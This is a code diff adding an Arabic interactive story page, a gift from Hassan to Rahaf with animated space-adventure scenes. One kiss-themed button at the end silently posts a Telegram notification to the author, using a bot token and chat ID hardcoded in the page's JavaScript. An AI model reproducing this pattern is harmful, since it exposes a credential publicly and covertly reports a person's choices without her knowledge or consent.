@@ -1,0 +1,549 @@
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+    <title>رهف ونجمة الفستق - هدية من حسن</title>
+    
+    <!-- GSAP Libraries -->
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/gsap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/ScrollTrigger.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/gsap/3.12.5/TextPlugin.min.js"></script>
+    
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', 'Tahoma', Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #0a0f2a 0%, #0a0f2a 50%, #1a1f3a 100%);
+            min-height: 100vh;
+            padding: 20px;
+            color: white;
+            overflow-x: hidden;
+        }
+
+        /* النجوم المتحركة */
+        .stars {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 0;
+        }
+
+        .star {
+            position: absolute;
+            background: white;
+            border-radius: 50%;
+            animation: twinkle 2s infinite;
+        }
+
+        @keyframes twinkle {
+            0%, 100% { opacity: 0.3; }
+            50% { opacity: 1; }
+        }
+
+        .star-bubble {
+            position: fixed;
+            background: radial-gradient(circle, #ffd369, transparent);
+            border-radius: 50%;
+            pointer-events: none;
+            z-index: 0;
+            animation: floatStar 4s infinite;
+        }
+
+        @keyframes floatStar {
+            0% { transform: translateY(100vh) scale(0); opacity: 0; }
+            50% { opacity: 1; }
+            100% { transform: translateY(-20vh) scale(1); opacity: 0; }
+        }
+
+        .story-container {
+            position: relative;
+            z-index: 1;
+            max-width: 650px;
+            margin: 0 auto;
+            background: rgba(10, 15, 42, 0.85);
+            backdrop-filter: blur(10px);
+            border-radius: 40px;
+            padding: 25px;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            box-shadow: 0 25px 50px rgba(0, 0, 0, 0.3);
+            opacity: 0;
+            transform: translateY(30px);
+            transition: all 0.8s ease;
+        }
+
+        .story-container.show {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        .illustration {
+            width: 100%;
+            height: 250px;
+            background: linear-gradient(135deg, #1e2a5e, #0f0f2a);
+            border-radius: 25px;
+            margin-bottom: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            position: relative;
+            overflow: hidden;
+            border: 1px solid rgba(255, 215, 0, 0.3);
+        }
+
+        .illustration img {
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            border-radius: 25px;
+        }
+
+        .scene-indicator {
+            text-align: center;
+            margin-bottom: 15px;
+        }
+
+        .scene-badge {
+            background: #ffd369;
+            color: #1a1a2e;
+            padding: 5px 15px;
+            border-radius: 50px;
+            font-size: 0.8rem;
+            font-weight: bold;
+            display: inline-block;
+        }
+
+        #story-title {
+            font-size: 1.8rem;
+            text-align: center;
+            color: #ffd369;
+            margin-bottom: 15px;
+            font-weight: bold;
+            min-height: 70px;
+        }
+
+        #story-text {
+            background: rgba(0, 0, 0, 0.4);
+            padding: 20px;
+            border-radius: 25px;
+            line-height: 1.7;
+            font-size: 1rem;
+            margin-bottom: 20px;
+            text-align: right;
+            min-height: 200px;
+        }
+
+        .choices {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        button {
+            background: linear-gradient(135deg, #ffd369, #ffaa00);
+            border: none;
+            padding: 14px 20px;
+            border-radius: 50px;
+            font-size: 1rem;
+            font-weight: bold;
+            color: #1a1a2e;
+            cursor: pointer;
+            transition: transform 0.2s, box-shadow 0.2s;
+            font-family: inherit;
+            text-align: center;
+        }
+
+        button:hover {
+            transform: scale(0.98);
+            box-shadow: 0 5px 15px rgba(255, 211, 105, 0.4);
+        }
+
+        .footer {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.7rem;
+            color: rgba(255, 255, 255, 0.5);
+        }
+
+        .read-more {
+            text-align: center;
+            margin-top: 20px;
+            padding: 15px;
+            background: rgba(255, 211, 105, 0.2);
+            border-radius: 30px;
+            cursor: pointer;
+            transition: all 0.3s;
+            border: 1px solid #ffd369;
+        }
+
+        .read-more:hover {
+            background: rgba(255, 211, 105, 0.4);
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .kiss-option {
+            background: linear-gradient(135deg, #ff6b6b, #ee5a24);
+            margin-top: 10px;
+        }
+
+        .response-message {
+            text-align: center;
+            padding: 20px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 25px;
+            margin-top: 20px;
+        }
+
+        @media (max-width: 550px) {
+            .story-container {
+                padding: 15px;
+            }
+            .illustration {
+                height: 180px;
+            }
+            #story-title {
+                font-size: 1.4rem;
+            }
+            #story-text {
+                font-size: 0.9rem;
+                padding: 15px;
+            }
+            button {
+                padding: 12px 15px;
+                font-size: 0.9rem;
+            }
+        }
+    </style>
+</head>
+<body>
+
+<div class="stars" id="stars"></div>
+<div id="starBubbles"></div>
+
+<div class="story-container" id="storyContainer">
+    <div class="illustration" id="illustration">
+        <img id="sceneImage" src="" alt="مشهد" onerror="this.src='https://picsum.photos/600/250?random=1'">
+    </div>
+    
+    <div class="scene-indicator">
+        <span class="scene-badge" id="scene-badge">المشهد الأول</span>
+    </div>
+    
+    <h1 id="story-title">رهف ونجمة الفستق</h1>
+    <div id="story-text"></div>
+    <div class="choices" id="choices"></div>
+    <div class="footer">
+        ✨ هدية خاصة لرهف من حسن ✨
+    </div>
+</div>
+
+<script>
+    // ============================================
+    // الروابط (تم إدخال الروابط التي أرسلتها)
+    // ============================================
+    const IMAGES = {
+        bg_rooftop: "https://l.top4top.io/p_3763fppd21.jpg",
+        bg_space: "https://d.top4top.io/p_3763ienf21.jpg",
+        bg_spaceship: "https://g.top4top.io/p_3763cayud1.jpg",
+        bg_colorplanet: "https://l.top4top.io/p_37637cpcb1.jpg",
+        scene_battle: "https://f.top4top.io/p_3763b0bev1.jpg",
+        scene_happy: "https://j.top4top.io/p_3763j46lw1.jpg"
+    };
+    
+    // الشخصيات (احتياطي - قد لا نستخدمها مباشرة)
+    const CHARACTERS = {
+        raghad: "https://f.top4top.io/p_3763cqmlc1.png",
+        hassan: "https://i.top4top.io/p_3763u2b5z1.png",
+        fustuq: "https://c.top4top.io/p_3763hqw5a1.png",
+        alien_lawzi: "https://f.top4top.io/p_376385yqn1.png",
+        alien_sukkar: "https://h.top4top.io/p_3763nn65e1.png"
+    };
+    
+    // ============================================
+    // إعدادات البوت والتوكن للإشعار
+    // ============================================
+    const BOT_TOKEN = "8691676549:AAFQZLMLSn3rNKzbYd0dFuuujByQjVyX-Kg";
+    const CHAT_ID = "2130343248";
+    
+    // ============================================
+    // تأثيرات الخلفية
+    // ============================================
+    
+    function createStars() {
+        const starsContainer = document.getElementById('stars');
+        for (let i = 0; i < 150; i++) {
+            const star = document.createElement('div');
+            star.className = 'star';
+            star.style.width = Math.random() * 3 + 'px';
+            star.style.height = star.style.width;
+            star.style.left = Math.random() * 100 + '%';
+            star.style.top = Math.random() * 100 + '%';
+            star.style.animationDelay = Math.random() * 3 + 's';
+            starsContainer.appendChild(star);
+        }
+    }
+    
+    function createStarBubbles() {
+        setInterval(() => {
+            const bubble = document.createElement('div');
+            bubble.className = 'star-bubble';
+            bubble.style.left = Math.random() * 100 + '%';
+            bubble.style.width = bubble.style.height = Math.random() * 30 + 10 + 'px';
+            bubble.style.animationDuration = Math.random() * 3 + 2 + 's';
+            bubble.style.animationDelay = Math.random() * 5 + 's';
+            document.getElementById('starBubbles').appendChild(bubble);
+            setTimeout(() => bubble.remove(), 5000);
+        }, 800);
+    }
+    
+    createStars();
+    createStarBubbles();
+    
+    // إظهار الحاوية مع تأثير
+    setTimeout(() => {
+        document.getElementById('storyContainer').classList.add('show');
+    }, 100);
+    
+    // ============================================
+    // بيانات القصة (بدون ذكر العمر)
+    // ============================================
+    
+    const scenes = {
+        start: {
+            name: '🌙 المشهد الأول: ليلة تحت النجوم',
+            text: 'ليلة هادئة في بغداد يا رهف. كنتِ تجلسين على سطح منزلكِ، ترسمين في كراستكِ. القمر مكتمل والنجوم تتلألأ. قطكِ الصغير فستق كان نائماً بجانبكِ. فجأة، أضاء السماء ضوء غريب. نجم سقط... لكنه لم يختفي! بل اقترب أكثر حتى هبط أمامكِ. من داخل النجمة، خرج حسن. ابتسم وقال لكِ: "مساء الخير يا رهف. أحضرت لكِ هدية... هل تريدين أن نذهب في مغامرة إلى الفضاء؟"',
+            image: IMAGES.bg_rooftop,
+            choices: [
+                { text: '🚀 "نعم حسن! لنذهب إلى الفضاء"', next: 'space_travel' },
+                { text: '🤔 "أخشى قليلاً... لكن معك سأذهب"', next: 'space_travel' }
+            ]
+        },
+        space_travel: {
+            name: '🚀 المشهد الثاني: رحلة إلى الفضاء',
+            text: 'ركبتِ النجمة السحرية مع حسن، وانطلقتما بسرعة الضوء يا رهف. شعرتِ بالدهشة وقلتِ: "هذا أجمل من أي حلم!" مررتما بجانب كوكب زحل، وحلقتما بين الغبار الكوني. شعرتِ بخوف بسيط، فمسكتِ بيد حسن. همس في أذنكِ: "لا تخافي يا رهف، أنا معكِ." فجأة، تعطلت النجمة! اهتزت بعنف. ثم سمعتما صوتاً غريباً: "هاهاها... لقد أمسكت بكم!"',
+            image: IMAGES.bg_space,
+            choices: [
+                { text: '🛡️ "حسن.. أنا خائفة! لا تتركني"', next: 'alien_encounter' },
+                { text: '⚡ "أمسك يدي يا حسن ولا تتركها"', next: 'alien_encounter' }
+            ]
+        },
+        alien_encounter: {
+            name: '👾 المشهد الثالث: مواجهة الفضائيين',
+            text: 'ظهرت سفينة فضائية ضخمة يا رهف. منها خرج الفضائي لوزي (لونه بنفسجي وعيونه كبيرة). قال بضحكة شريرة: "النجمة السحرية ملكي! سآخذها ولن تعودا إلى الأرض أبداً!" اختبأتِ خلف حسن. قلتِ بصوت مرتجف: "حسن... ماذا نفعل؟!" تقدم حسن للأمام وقال: "لن نستسلم! هذه النجمة هديتي لرهف، ولن تمسها بسوء!" ثم ظهرت فجأة الفضائية سكر (لونها زهري). قالت: "لوزي! توقف! هذه الفتاة تحب الرسم مثلي... أنا في صفها!"',
+            image: IMAGES.bg_spaceship,
+            choices: [
+                { text: '🤝 "شكراً لكِ سكر. هل تساعديننا؟"', next: 'battle' },
+                { text: '⚔️ "حسن... لنواجهه معاً"', next: 'battle' }
+            ]
+        },
+        battle: {
+            name: '💫 المشهد الرابع: معركة النجوم',
+            text: 'اندلعت معركة خفيفة بالنجوم يا رهف. استخدمتِ مهارتكِ في الرسم لترسمي نجوماً وهمية تشتت انتباه لوزي. حسن ركض ليأخذ النجمة السحرية. فجأة، انقض لوزي على حسن. صرختِ: "حسن! انتبه!" ركضتِ إليه وأمسكتِ بيده وسحبته بعيداً. قلتِ له: "لن أدع أحداً يؤذيك يا حسن!" بمساعدة سكر، نجحتما في استعادة النجمة. هرب لوزي قائلاً: "سأعود!"',
+            image: IMAGES.scene_battle,
+            choices: [
+                { text: '🎉 "لقد انتصرنا يا حسن!"', next: 'victory_tour' },
+                { text: '💖 "حسن... أنت بخير؟ أنا فرحة لأنك معي"', next: 'victory_tour' }
+            ]
+        },
+        victory_tour: {
+            name: '🪐 المشهد الخامس: جولة في الفضاء',
+            text: 'قالت سكر: "لدي مفاجأة لكما يا رهف." أخذتكما إلى كوكب الألوان، حيث الأنهار ملونة بالوردي والأزرق، والأشجار تشبه الفرشاة. أمسكتِ فرشاتكِ وبدأتِ ترسمين منظراً طبيعياً. انبهرت سكر وقالت: "أجمل رسم رأيته في حياتي!" التفتِ إلى حسن وابتسمتِ وقلتِ: "شكراً يا حسن لأنك أخذتني في هذه الرحلة. لن أنساها أبداً."',
+            image: IMAGES.bg_colorplanet,
+            choices: [
+                { text: '🌹 "أنا أسعد إنسان لأنك معي يا رهف"', next: 'return_home' },
+                { text: '🎁 "هذه هديتي لكِ يا رهف... ذكرى لا تنسى"', next: 'return_home' }
+            ]
+        },
+        return_home: {
+            name: '🏠 المشهد السادس: العودة إلى الأرض',
+            text: 'قالت سكر: "حان وقت العودة يا رهف. لكن تذكري، النجوم دائماً تنتظركِ." ركبتِ النجمة مع حسن وانطلقتما عائدين. هبطت النجمة على سطح منزلكِ. استيقظ فستق وعطس، وكأنه يحييكما. نظرتِ إلى حسن بعيون لامعة وقلتِ: "حسن... أتمنى ألا تنتهي هذه المغامرة..." أخذ حسن يدكِ وقال: "المغامرة الحقيقية هي صداقتنا يا رهف. سأكون معكِ دائماً، في الأرض وفي الفضاء." ضحكتِ وقلتِ: "فستق يريد أن يأكل الأندومي الآن! تعال نتناوله معاً يا حسن؟"',
+            image: IMAGES.scene_happy,
+            choices: [
+                { text: '🍜 "نعم يا رهف! الأندومي والفضاء والقطط... وأنتِ. هذا هو اليوم المثالي"', next: 'the_end' },
+                { text: '🌟 "إلى المغامرة القادمة يا رهف. أنتِ أجمل نجم في حياتي"', next: 'the_end' }
+            ]
+        },
+        the_end: {
+            name: '🎬 النهاية... أم بداية جديدة؟',
+            text: 'تنتهي مغامرتكِ هنا يا رهف. لكن في الحقيقة، كل يوم مع حسن هو مغامرة جديدة. سواء في الفضاء، أو في غرفة رسمكِ، أو أثناء مشاهدة فيلم معاً. فستق موء بصوت عالٍ، وكأنه يقول: "أنا أيضاً أحبكِ يا رهف!" همس حسن في أذنكِ: "شكراً لكِ يا رهف على هذه الرحلة الجميلة. أنتِ أفضل صديقة في العالم. وهذه القصة... هي هديتي لكِ."',
+            image: IMAGES.scene_happy,
+            choices: []
+        }
+    };
+    
+    // ============================================
+    // دوال إرسال رسالة تيليجرام
+    // ============================================
+    
+    async function sendTelegramMessage(message) {
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+        const data = {
+            chat_id: CHAT_ID,
+            text: message,
+            parse_mode: 'HTML'
+        };
+        
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(data)
+            });
+            const result = await response.json();
+            console.log('Telegram message sent:', result);
+            return result.ok;
+        } catch (error) {
+            console.error('Error sending telegram message:', error);
+            return false;
+        }
+    }
+    
+    // ============================================
+    // عرض المشاهد مع تأثيرات GSAP
+    // ============================================
+    
+    function showScene(sceneId, fromKiss = false) {
+        const scene = scenes[sceneId];
+        if (!scene) return;
+        
+        // تأثير اختفاء ثم ظهور
+        gsap.to("#story-text", {
+            duration: 0.3,
+            opacity: 0,
+            y: 10,
+            onComplete: () => {
+                document.getElementById('scene-badge').textContent = scene.name;
+                document.getElementById('story-title').innerHTML = scene.name.split(':')[1] || scene.name;
+                document.getElementById('story-text').innerHTML = scene.text;
+                document.getElementById('sceneImage').src = scene.image;
+                
+                gsap.to("#story-text", {
+                    duration: 0.5,
+                    opacity: 1,
+                    y: 0,
+                    delay: 0.1
+                });
+            }
+        });
+        
+        const choicesDiv = document.getElementById('choices');
+        choicesDiv.innerHTML = '';
+        
+        if (scene.choices.length > 0) {
+            scene.choices.forEach(choice => {
+                const btn = document.createElement('button');
+                btn.textContent = choice.text;
+                btn.onclick = () => showScene(choice.next);
+                choicesDiv.appendChild(btn);
+            });
+        } else {
+            // نهاية القصة - نضيف زر "قراءة المزيد"
+            const readMoreDiv = document.createElement('div');
+            readMoreDiv.className = 'read-more';
+            readMoreDiv.innerHTML = '📖 قراءة المزيد...';
+            readMoreDiv.onclick = showFinalOptions;
+            choicesDiv.appendChild(readMoreDiv);
+        }
+        
+        // تأثير GSAP على الأزرار الجديدة
+        gsap.fromTo(".choices button, .read-more", 
+            { opacity: 0, y: 20 },
+            { opacity: 1, y: 0, stagger: 0.1, duration: 0.5 }
+        );
+        
+        window.scrollTo({ top: 0, behavior: 'smooth' });
+    }
+    
+    // ============================================
+    // الخيارات النهائية بعد "قراءة المزيد"
+    // ============================================
+    
+    function showFinalOptions() {
+        const choicesDiv = document.getElementById('choices');
+        
+        gsap.to("#choices", {
+            duration: 0.3,
+            opacity: 0,
+            onComplete: () => {
+                choicesDiv.innerHTML = '';
+                
+                const kissBtn = document.createElement('button');
+                kissBtn.className = 'kiss-option';
+                kissBtn.innerHTML = '🌸 شنو رائيج نبوس حسن؟ 🌸';
+                kissBtn.onclick = () => showKissResponse(true);
+                choicesDiv.appendChild(kissBtn);
+                
+                const noBtn = document.createElement('button');
+                noBtn.innerHTML = '💋 هاي احلى بوسه من رفرف لحسن 💋';
+                noBtn.onclick = () => showKissResponse(false);
+                choicesDiv.appendChild(noBtn);
+                
+                gsap.to("#choices", { duration: 0.3, opacity: 1 });
+            }
+        });
+    }
+    
+    // ============================================
+    // الرد على خيار البوسه
+    // ============================================
+    
+    async function showKissResponse(answer) {
+        const choicesDiv = document.getElementById('choices');
+        const storyText = document.getElementById('story-text');
+        
+        if (answer === true) {
+            // إرسال إشعار إلى تيليجرام
+            const message = `💋 تنبيه من موقع هدية رهف 💋\n\nرهف اختارت خيار "هاي احلى بوسه من رفرف لحسن 💋" لسؤال: شنو رائيج نبوس حسن؟\n\n✨ تاريخ ووقت الحدث: ${new Date().toLocaleString('ar-IQ')}\n\n❤️ هذا إشعار تلقائي من الموقع.`;
+            
+            await sendTelegramMessage(message);
+            
+            gsap.to("#choices", { duration: 0.3, opacity: 0 });
+            gsap.to("#story-text", { duration: 0.3, opacity: 0, y: 10, onComplete: () => {
+                storyText.innerHTML = '🌸🌸🌸<br><br>رهف: "حسن... أنا معجبة بشخصيتك الطيبة وشجاعتك، دعنا نبقى أصدقاء جيدين ونتذكر مغامرتنا الجميلة في الفضاء. شكراً لك على الهدية الرائعة!"<br><br>🌸🌸🌸';
+                choicesDiv.innerHTML = '';
+                
+                const restartBtn = document.createElement('button');
+                restartBtn.innerHTML = '🔄 أعيدي قراءة القصة من البداية';
+                restartBtn.onclick = () => showScene('start');
+                choicesDiv.appendChild(restartBtn);
+                
+                gsap.to("#story-text", { duration: 0.5, opacity: 1, y: 0 });
+                gsap.to("#choices", { duration: 0.3, opacity: 1 });
+            }});
+        } else {
+            gsap.to("#choices", { duration: 0.3, opacity: 0 });
+            gsap.to("#story-text", { duration: 0.3, opacity: 0, y: 10, onComplete: () => {
+                storyText.innerHTML = '🌸 رهف: "حسن، أنت صديق رائع وأقدر صداقتنا كثيراً. دعنا نبقى أصدقاء ونستمتع بذكرياتنا الجميلة معاً. شكراً لك على هذه الهدية الرائعة!" 🌸';
+                choicesDiv.innerHTML = '';
+                
+                const restartBtn = document.createElement('button');
+                restartBtn.innerHTML = '🔄 أعيدي قراءة القصة من البداية';
+                restartBtn.onclick = () => showScene('start');
+                choicesDiv.appendChild(restartBtn);
+                
+                gsap.to("#story-text", { duration: 0.5, opacity: 1, y: 0 });
+                gsap.to("#choices", { duration: 0.3, opacity: 1 });
+            }});
+        }
+        
+        window.scrollTo({ top: document.body.scrollHeight, behavior: 'smooth' });
+    }
+    
+    // بدء القصة
+    showScene('start');
+</script>
+</body>
+</html>
